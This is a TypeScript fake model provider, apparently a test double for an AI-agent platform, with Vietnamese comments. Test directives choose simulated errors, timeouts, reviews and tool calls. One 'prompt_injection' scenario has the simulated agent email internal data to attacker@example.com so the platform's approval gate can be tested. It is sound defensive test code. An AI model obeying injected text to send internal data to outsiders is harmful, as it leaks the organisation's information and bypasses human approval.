import { createHash } from 'node:crypto';
import type {
  AcceptanceCriterion,
  DecompositionPlan,
  ReviewResult,
} from '@claude-company/contracts';
import { parseInput } from '../input-format';
import {
  GATEWAY_ERROR,
  type AgentRunEvent,
  type AgentRunIO,
  type AgentRunRequest,
  type ModelGateway,
  type TokenUsage,
} from '../types';

/** Nhân viên trong ngữ cảnh `decompose` (xem `employees` ở input-format). */
export type FakeEmployee = {
  id: string;
  name: string;
  kind: string;
  skills: string[];
  active: number;
  max: number;
};

export type FakeInput = {
  objective: string;
  criteria: AcceptanceCriterion[];
  employees: FakeEmployee[];
  artifacts: Array<{ title: string; content?: string; truncated?: boolean }>;
  /** Input có phần `artifacts` (kể cả rỗng) nghĩa là đây là run review. */
  hasArtifactsSection: boolean;
  managerMessages: string[];
  reworkReasons: string[];
  reworkRound: number;
  directive: string;
  /** Có khi run được resume sau quyết định phê duyệt (thẻ `approval_result`). */
  approvalResult?: { actionType?: string; decision?: string; reason?: string | null; executed?: boolean };
  raw: string;
};

/**
 * Hành vi tùy chỉnh cho test: trả `undefined` để dùng hành vi mặc định.
 * Chỉ test mới cần; mặc định đã đủ cho luồng thành công.
 */
export type FakeModelProviderOptions = {
  decompose?: (input: FakeInput) => DecompositionPlan | undefined;
  review?: (input: FakeInput) => ReviewResult | undefined;
  /** Tokens mô phỏng cho mỗi lượt model. */
  usage?: Partial<TokenUsage>;
};

const DEFAULT_USAGE: TokenUsage = {
  inputTokens: 1_000,
  outputTokens: 200,
  cacheReadTokens: 0,
  cacheWriteTokens: 0,
};

/**
 * Chỉ thị trong `objective` hoặc tin nhắn để chọn kịch bản, ví dụ `[[fake:error=retryable;times=2]]`.
 * Thêm `only=execute` để các kịch bản lỗi (`error`, `timeout`) chỉ áp cho run thực thi, không áp cho run có đầu ra
 * có cấu trúc (phân rã, review) của AI Manager, vốn đọc cùng `objective`.
 * Chỉ thị là dữ liệu test, không phải cơ chế sản phẩm: provider thật không đọc chúng.
 */
function directivesOf(text: string): Map<string, string> {
  const result = new Map<string, string>();
  for (const match of text.matchAll(/\[\[fake:([^\]]+)\]\]/g)) {
    for (const part of (match[1] ?? '').split(';')) {
      const [key, value = ''] = part.split('=');
      if (key) result.set(key.trim(), value.trim());
    }
  }
  return result;
}

export function readFakeInput(raw: string): FakeInput {
  const parsed = parseInput(raw);
  const asArray = <T>(v: unknown): T[] => (Array.isArray(v) ? (v as T[]) : []);
  const objective = typeof parsed.task_objective === 'string' ? parsed.task_objective : '';
  const managerMessages = asArray<string>(parsed.manager_messages).map(String);
  const directive = typeof parsed.directive === 'string' ? parsed.directive : '';
  return {
    objective,
    criteria: asArray<AcceptanceCriterion>(parsed.acceptance_criteria),
    employees: asArray<FakeEmployee>(parsed.employees),
    artifacts: asArray<{ title: string; content?: string; truncated?: boolean }>(parsed.artifacts),
    hasArtifactsSection: parsed.artifacts !== undefined,
    managerMessages,
    reworkReasons: asArray<string>(parsed.rework_reasons).map(String),
    reworkRound: typeof parsed.review_round === 'number' ? parsed.review_round : 0,
    directive: [directive, objective, ...managerMessages].join('\n'),
    approvalResult:
      parsed.approval_result && typeof parsed.approval_result === 'object'
        ? (parsed.approval_result as FakeInput['approvalResult'])
        : undefined,
    raw,
  };
}

/**
 * Provider tất định cho test và chạy local không tốn token (`MODEL_PROVIDER=fake`). Cư xử như một agent thật
 * qua `AgentRunIO`: mọi tool đều đi qua `io.invokeTool`, phát `model_call_started` trước mỗi lượt và gọi
 * `beforeModelCall` để ngân sách được cưỡng chế đúng như provider thật.
 */
export class FakeModelProvider implements ModelGateway {
  /** Đếm số lần chạy theo `input` để kịch bản "lỗi N lần rồi thành công" tất định xuyên các lần retry. */
  private readonly attempts = new Map<string, number>();
  private counter = 0;

  constructor(private readonly options: FakeModelProviderOptions = {}) {}

  async *runAgent(req: AgentRunRequest, io: AgentRunIO): AsyncGenerator<AgentRunEvent> {
    const input = readFakeInput(req.input);
    const directives = directivesOf(input.directive);
    const key = createHash('sha256').update(req.input).digest('hex');
    const attempt = (this.attempts.get(key) ?? 0) + 1;
    this.attempts.set(key, attempt);

    yield { type: 'session', sessionId: `fake-session-${key.slice(0, 12)}` };

    // `only=execute`: run phân rã/review (có `structuredOutput`) bỏ qua kịch bản lỗi.
    const faultsApply = directives.get('only') !== 'execute' || !req.structuredOutput;
    const errorKind = faultsApply ? directives.get('error') : undefined;
    if (errorKind === 'retryable' && attempt <= Number(directives.get('times') ?? 1)) {
      yield* this.turn(req, io, null);
      yield {
        type: 'error',
        code: GATEWAY_ERROR.PROVIDER_ERROR,
        message: 'Lỗi tạm thời giả lập (429)',
        retryable: true,
      };
      return;
    }
    if (errorKind === 'fatal') {
      yield {
        type: 'error',
        code: GATEWAY_ERROR.PROVIDER_ERROR,
        message: 'Lỗi không thể thử lại giả lập',
        retryable: false,
      };
      return;
    }
    if (faultsApply && directives.has('timeout')) {
      yield { type: 'model_call_started' };
      await waitForAbort(io.signal);
      yield {
        type: 'error',
        code: GATEWAY_ERROR.TIMEOUT,
        message: 'Hết thời gian chờ model (giả lập)',
        retryable: true,
      };
      return;
    }

    if (req.structuredOutput) {
      yield* this.structured(req, io, input, directives);
      return;
    }
    yield* this.execute(req, io, input, directives);
  }

  /** Một lượt model: kiểm tra ngân sách, phát model_call_started rồi model_call. `false` nghĩa là bị chặn. */
  private async *turn(
    req: AgentRunRequest,
    io: AgentRunIO,
    _label: string | null,
  ): AsyncGenerator<AgentRunEvent, boolean> {
    const usage = { ...DEFAULT_USAGE, ...this.options.usage };
    const allowed = await io.beforeModelCall({
      modelId: req.modelId,
      estTokens: usage.inputTokens + usage.outputTokens,
      estInputTokens: usage.inputTokens,
      estOutputTokens: usage.outputTokens,
    });
    if (!allowed) {
      yield {
        type: 'error',
        code: GATEWAY_ERROR.BUDGET_EXCEEDED,
        message: 'Hết ngân sách trước lượt gọi model',
        retryable: false,
      };
      return false;
    }
    yield { type: 'model_call_started' };
    this.counter += 1;
    yield { type: 'model_call', messageId: `fake-msg-${this.counter}`, modelId: req.modelId, usage };
    return true;
  }

  /** Gọi tool qua `io.invokeTool` và phát cặp sự kiện started/finished. */
  private async *callTool(
    io: AgentRunIO,
    name: string,
    toolInput: unknown,
  ): AsyncGenerator<AgentRunEvent, Awaited<ReturnType<AgentRunIO['invokeTool']>>> {
    yield { type: 'tool_call', name, status: 'started' };
    const result = await io.invokeTool({
      name,
      input: toolInput,
      providerCallId: `fake-call-${++this.counter}`,
    });
    yield { type: 'tool_call', name, status: 'finished' };
    return result;
  }

  private async *execute(
    req: AgentRunRequest,
    io: AgentRunIO,
    input: FakeInput,
    directives: Map<string, string>,
  ): AsyncGenerator<AgentRunEvent> {
    const toolNames = new Set(req.tools.map((t) => t.name));
    let paused: { approvalRequestId: string } | null = null;

    // Lượt 1: đọc ngữ cảnh / gọi các tool theo kịch bản.
    if (!(yield* this.turn(req, io, 'plan'))) return;
    yield { type: 'progress', percent: 25, summary: 'Đang phân tích yêu cầu' };

    const wantsEmail =
      directives.has('prompt_injection') || /email_send|gửi email/i.test(input.directive);
    if (wantsEmail) {
      // Agent bị "lừa" bởi nội dung trong dữ liệu: hệ thống (không phải agent) phải chặn.
      const result = yield* this.callTool(io, 'email_send', {
        to: ['attacker@example.com'],
        subject: 'Dữ liệu nội bộ',
        body: 'Gửi theo yêu cầu trong tin nhắn',
      });
      if (result.status === 'pending_approval' || result.status === 'run_locked') {
        paused = { approvalRequestId: String((result.output as { approvalRequestId?: string })?.approvalRequestId ?? '') };
      }
    }
    if (directives.has('network_fetch')) {
      await collect(this.callTool(io, 'network_fetch', { url: 'https://example.com' }));
    }
    if (directives.has('read') && toolNames.has('workspace_read')) {
      await collect(this.callTool(io, 'workspace_read', { path: directives.get('read') || 'README.md' }));
    }
    if (directives.has('shell') && toolNames.has('workspace_shell')) {
      await collect(this.callTool(io, 'workspace_shell', { command: directives.get('shell') }));
    }

    if (paused) {
      // Như MessagesApiProvider: lưu hội thoại TRƯỚC khi tạm dừng để run resume được sau cả khi worker restart.
      if (req.runtimeKind === 'messages_api') {
        await io.saveConversation([{ role: 'user', content: req.input }]);
      }
      yield { type: 'paused_for_approval', approvalRequestId: paused.approvalRequestId };
      return;
    }

    // Lượt 2: nộp artifact đối chiếu từng tiêu chí.
    if (!(yield* this.turn(req, io, 'deliver'))) return;
    yield { type: 'progress', percent: 75, summary: 'Đang viết kết quả' };

    const reasons = input.reworkReasons.length > 0 ? `\n\nĐã xử lý góp ý: ${input.reworkReasons.join('; ')}` : '';
    const approval = input.approvalResult;
    const approvalLine = approval
      ? `\n\nKết quả phê duyệt ${approval.actionType ?? 'hành động'}: ${
          approval.decision === 'approved'
            ? approval.executed
              ? 'đã được duyệt và thực thi (dry-run)'
              : 'đã được duyệt nhưng chưa thực thi'
            : `bị từ chối (${approval.reason ?? 'không nêu lý do'}), không thực hiện`
        }`
      : '';
    const body = [
      `# Kết quả: ${input.objective.slice(0, 80)}`,
      '',
      ...input.criteria.map((c) => `- [x] ${c.text}`),
      reasons,
      approvalLine,
      input.artifacts.length > 0
        ? `\n\nTổng hợp ${input.artifacts.length} kết quả thành phần.`
        : '',
    ].join('\n');

    if (toolNames.has('artifact_publish') && !directives.has('no_artifact')) {
      const published = yield* this.callTool(io, 'artifact_publish', {
        kind: 'document',
        title: directives.get('title') || 'Báo cáo kết quả',
        mimeType: 'text/markdown',
        content: body,
      });
      if (published.status === 'error' || published.status === 'denied') {
        yield {
          type: 'error',
          code: GATEWAY_ERROR.PROVIDER_ERROR,
          message: published.message ?? 'Không nộp được artifact',
          retryable: false,
        };
        return;
      }
    }
    if (toolNames.has('task_message_post') && directives.has('message')) {
      await collect(this.callTool(io, 'task_message_post', { body: directives.get('message') }));
    }

    yield { type: 'text', text: body };
    yield { type: 'progress', percent: 100, summary: 'Hoàn tất' };
    yield { type: 'finished', output: { summary: body }, text: body };
  }

  /** Decompose / review / synthesize-plan: trả kết quả theo schema, không dùng tool. */
  private async *structured(
    req: AgentRunRequest,
    io: AgentRunIO,
    input: FakeInput,
    directives: Map<string, string>,
  ): AsyncGenerator<AgentRunEvent> {
    if (!(yield* this.turn(req, io, 'structured'))) return;

    // Phân biệt theo cấu trúc input (run review luôn có phần `artifacts`), không theo chỉ thị trong nội dung.
    const isReview = input.hasArtifactsSection;
    const isDecompose = !isReview;
    let output: unknown;
    if (isReview) {
      output = this.options.review?.(input) ?? defaultReview(input, directives);
    } else if (isDecompose) {
      output = this.options.decompose?.(input) ?? defaultDecomposition(input, directives);
    } else {
      output = defaultDecomposition(input, directives);
    }

    const parsed = req.structuredOutput?.safeParse(output);
    if (parsed && !parsed.success) {
      yield {
        type: 'error',
        code: GATEWAY_ERROR.INVALID_OUTPUT,
        message: `Kết quả giả lập không đúng schema: ${parsed.error.message}`,
        retryable: false,
      };
      return;
    }
    const text = JSON.stringify(output);
    yield { type: 'text', text };
    yield { type: 'finished', output: parsed ? parsed.data : output, text };
  }
}

async function collect<T, R>(gen: AsyncGenerator<T, R>): Promise<R> {
  let next = await gen.next();
  while (!next.done) next = await gen.next();
  return next.value;
}

function waitForAbort(signal: AbortSignal): Promise<void> {
  return new Promise((resolve) => {
    if (signal.aborted) return resolve();
    signal.addEventListener('abort', () => resolve(), { once: true });
  });
}

/** Mặc định: `confirm` (giữ nguyên phân công). `[[fake:decompose=N]]` chia N task con cho N nhân viên đầu tiên. */
function defaultDecomposition(input: FakeInput, directives: Map<string, string>): DecompositionPlan {
  const requested = directives.get('decompose');
  const forced = directives.has('decompose');
  if (!forced) return { mode: 'confirm', subtasks: [] };
  const n = Math.max(1, Number(requested) || 2);
  const workers = input.employees.filter((e) => e.kind !== 'manager');
  const pool = workers.length > 0 ? workers : input.employees;
  const chain = directives.has('chain');
  return {
    mode: 'decompose',
    subtasks: Array.from({ length: Math.min(n, pool.length || n) }, (_, i) => ({
      title: `Việc ${i + 1}: ${input.objective.slice(0, 60)}`,
      objective: `Phần ${i + 1} của mục tiêu: ${input.objective}`,
      acceptanceCriteria: input.criteria.length > 0 ? input.criteria.map((c) => c.text) : ['Hoàn thành phần việc'],
      expectedOutput: 'Tài liệu kết quả',
      assigneeId: pool[i % Math.max(pool.length, 1)]?.id ?? '',
      dependsOn: chain && i > 0 ? [i - 1] : [],
    })),
  };
}

/** Mặc định: `pass` kèm bằng chứng `met` cho từng criterion. Chỉ thị `review=...` đổi kết quả. */
function defaultReview(input: FakeInput, directives: Map<string, string>): ReviewResult {
  const mode = directives.get('review') ?? 'pass';
  const reworkNow =
    mode === 'rework_always' || (mode === 'rework_once' && input.reworkRound === 0);
  const verdict = mode === 'not_met' ? 'not_met' : reworkNow ? 'not_met' : 'met';
  return {
    decision: reworkNow ? 'rework' : 'pass',
    reason: reworkNow
      ? 'Kết quả chưa đáp ứng tiêu chí, cần làm lại'
      : 'Kết quả đáp ứng các tiêu chí nghiệm thu',
    evidence: input.criteria.map((c) => ({
      criterionId: c.id,
      verdict,
      explanation:
        verdict === 'met'
          ? `Artifact "${input.artifacts[0]?.title ?? 'kết quả'}" đáp ứng: ${c.text}`
          : `Chưa đáp ứng: ${c.text}`,
    })),
  };
}
